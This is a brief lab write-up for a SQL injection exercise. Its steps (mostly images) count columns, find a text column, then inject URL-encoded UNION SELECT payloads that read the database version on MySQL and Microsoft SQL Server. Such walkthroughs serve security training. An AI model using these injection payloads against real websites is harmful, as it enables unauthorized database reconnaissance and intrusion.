## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

## Step 1

Check number of column

<img src=Images/ps1.png width="400" height="200">

## Step 2

Check in which column we can insert

<img src=Images/ps2.png width="400" height="200">

Here we are able to insert in both column

<img src=Images/ps3.png width="400" height="200">

## Step 3

Now we use this payload

' UNION SELECT @@version--

Modify query to

' UNION SELECT @@version,NULL#

Or

' UNION SELECT NULL,@@version#

Encode it to URL

<img src=Images/ps4.png width="400" height="200">

And we have the answer

<img src=Images/ps5.png width="400" height="200">

---
